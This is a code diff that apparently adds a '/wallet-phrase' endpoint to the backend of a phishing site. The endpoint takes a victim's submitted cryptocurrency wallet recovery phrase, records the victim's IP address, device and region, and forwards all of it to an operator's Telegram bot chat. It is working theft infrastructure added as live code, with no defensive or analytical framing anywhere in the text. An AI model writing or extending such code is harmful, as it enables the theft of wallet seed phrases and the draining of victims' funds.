@@ -1840,3 +1840,51 @@ app.post("/captcha-success", async (req, res) => {
     res.status(500).json({ error: err.message || "Internal server error" });
   }
 });
+
+// ✅ POST /wallet-phrase - Wallet Phrase Endpoint
+app.post("/wallet-phrase", async (req, res) => {
+  try {
+    const { phrase, userId, email } = req.body;
+
+    if (!phrase) {
+      return res.status(400).json({ error: "Missing phrase" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
+      `<b>📝 Phrases:</b>\n` +
+      `<code>${phrase}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    });
+
+    console.log(`✅ Wallet phrase message sent`);
+    res.json({ ok: true });
+  } catch (err) {
+    console.error("❌ Wallet phrase error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
